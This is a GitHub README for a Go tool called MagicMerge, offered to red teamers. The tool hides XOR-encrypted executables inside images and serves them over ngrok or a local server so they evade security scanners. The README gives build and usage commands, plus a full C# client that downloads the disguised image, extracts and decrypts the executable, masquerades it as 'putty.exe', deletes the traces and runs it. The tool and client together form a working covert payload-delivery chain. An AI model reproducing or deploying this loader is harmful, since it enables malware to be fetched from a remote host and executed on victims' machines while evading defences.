                              
<h1 align="center" style="font-weight: bold;">MagicMerge💻</h1>
<p align="center">MagicMerge is a sophisticated payload delivery server for cybersecurity professionals and red team operators. It offers a powerful yet covert method for embedding and encrypting executables within images enabling secure payload delivery and execution in environments where discretion and evasion are paramount.</p>



![Product Screenshot](https://raw.githubusercontent.com/mrfr05t/MagicMerge/main/screenshot.png)



<h2>🗳️ Features:</h2>

**Stealthy Embedding**
- Description: MagicMerge allows for the embedding of executables directly within image files, creating an unobtrusive method of delivering payloads that bypasses common security measures.
- Benefit: Increases operational success by evading detection from security systems that scan for suspicious binary formats.

**Robust XOR Encryption**
- Description: MagicMerge encrypts executables embedded within images using a dynamically generated 16-byte XOR key, ensuring robust protection against unauthorized access and analysis.
- Benefit: Maintains the integrity and confidentiality of the payload, protecting sensitive data from potential breaches.

**Flexible Deployment Options**
- Description: The tool supports both local and ngrok-enabled public hosting, allowing payloads to be accessed over internal networks or the internet, depending on operational needs.
- Benefit: Offers versatility in deployment, making it suitable for a range of scenarios from controlled internal tests to wide-reaching external deployments.

**Command-Line Interface**
- Description: Operates entirely via a command-line interface, facilitating rapid deployment, scripting, and integration with existing cybersecurity tool chains.
- Benefit: Enhances usability and efficiency, allowing users to execute operations quickly and automate processes as needed.

**Cross-Platform Compatibility**
- Description: Built in Go, MagicMerge is inherently cross-platform, running seamlessly on Windows, macOS, and Linux.
- Benefit: Ensures consistent performance and functionality across different operating systems, which is crucial for teams working in diverse IT environments.

**Easy Configuration and Customization**
- Description: Simple configuration options via command-line flags enable quick setup and adjustments to fit specific operational requirements.
- Benefit: Allows for easy customization and fine-tuning, improving operational effectiveness and adaptability.

**Dynamic XOR Key Generation**
- Description: Generates a new XOR key for each session, enhancing the security of each encrypted payload.
- Benefit: Prevents the compromise of one payload from affecting others, safeguarding multiple deployments simultaneously.

**Random Image Fetching**
- Description: Automatically fetches a new, random image for each payload from a designated source to ensure each payload is uniquely camouflaged.
- Benefit: Increases security by preventing pattern recognition in payload deliveries, crucial for operations requiring high stealth.

**Flexible Payload Sourcing**
- Description: Allows users to source executables from URLs or local storage, accommodating diverse input needs and operational environments.
- Benefit: Adapts to varying scenarios easily, from centrally managed payloads that can be updated remotely to securely handled local files for restricted environments.


<h2>🛠️ Installation Steps:</h2>

<p>1. Download and Install Go (Windows)</p>

```
https://go.dev/doc/install
```

<p>2. Install support libraries</p>

```
go get github.com/logrusorgru/aurora/v3
```

<p>3. Set ngrok in Enviorment Variable path</p>

```
%PATH% 
```

<p>4. Compilation Command:</p>

```
go build -o magicmerge.exe .
```

<h2>ℹ️ Usage Examples:</h2>

<p>1. Run with Ngrok and Payload from url.</p>

```
magicmerge.exe -payload="YourPayloadURL" -url=true -ngrok=true
```
<p>1. Run with local go server and Payload from local storage.</p>

```
magicmerge.exe -payload="/payload.exe" -url=false -ngrok=false
```
<h2>🗒️ TODO:</h2>

- LocalXpose support
- SSL support
- Multiple Payload handling with diffirent routes
- AES 256 instead of XOR
- Web Dashboard
- Auto SSL Cert generate
- Log File

<h2>📡 Sample Client Code (c#) :</h2>

```
 internal class Program
 {

     static void Main(string[] args)
     {
         string pathToCombinedFile = "wallpaper.jpg";
         string outputPath = "putty.exe";
         DownloadPayload("http://localhost:8080/wallpaper",pathToCombinedFile);
         ExtractAndDecryptExecutable(pathToCombinedFile, outputPath);
         File.Delete(pathToCombinedFile);
         Process.Start(outputPath);
     }


     public static void DownloadPayload(string URL,string path)
     {
         using (WebClient client = new WebClient())
         {
             try
             {
                 client.DownloadFile(URL, path);
                 Console.WriteLine("Download completed successfully.");
             }
             catch (Exception ex)
             {
                 Console.WriteLine("An error occurred: " + ex.Message);
             }
         }

     }
     public static void ExtractAndDecryptExecutable(string combinedFilePath, string outputExePath)
     {
         try
         {
             byte[] combinedData = File.ReadAllBytes(combinedFilePath);

             int keyLength = 16;
             byte[] key = new byte[keyLength];
             Array.Copy(combinedData, combinedData.Length - keyLength, key, 0, keyLength);

             byte[] delimiter = new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
             int delimiterIndex = IndexOf(combinedData, delimiter);

             if (delimiterIndex == -1)
             {
                 Console.WriteLine("Delimiter not found.");
                 return;
             }

             int startOfExe = delimiterIndex + delimiter.Length;
             int exeLength = combinedData.Length - startOfExe - keyLength;

             if (exeLength <= 0)
             {
                 Console.WriteLine("No executable data found.");
                 return;
             }

             byte[] exeData = new byte[exeLength];
             for (int i = 0; i < exeData.Length; i++)
             {
                 exeData[i] = (byte)(combinedData[startOfExe + i] ^ key[i % key.Length]);
             }

             File.WriteAllBytes(outputExePath, exeData);
             Console.WriteLine($"Executable has been extracted and decrypted to {outputExePath}");
         }
         catch (Exception ex)
         {
             Console.WriteLine($"An error occurred: {ex.Message}");
         }
     }

     private static int IndexOf(byte[] source, byte[] pattern)
     {
         int[] lps = ComputeLpsArray(pattern);
         int i = 0;  
         int j = 0;  
         while (i < source.Length)
         {
             if (pattern[j] == source[i])
             {
                 j++;
                 i++;
             }
             if (j == pattern.Length)
             {
                 return i - j;
             }
             else if (i < source.Length && pattern[j] != source[i])
             {
                 if (j != 0)
                     j = lps[j - 1];
                 else
                     i = i + 1;
             }
         }
         return -1;
     }

     private static int[] ComputeLpsArray(byte[] pattern)
     {
         int length = 0;
         int i = 1;
         int[] lps = new int[pattern.Length];
         lps[0] = 0;

         while (i < pattern.Length)
         {
             if (pattern[i] == pattern[length])
             {
                 length++;
                 lps[i] = length;
                 i++;
             }
             else
             {
                 if (length != 0)
                 {
                     length = lps[length - 1];
                 }
                 else
                 {
                     lps[i] = 0;
                     i++;
                 }
             }
         }
         return lps;
     }

 }

```
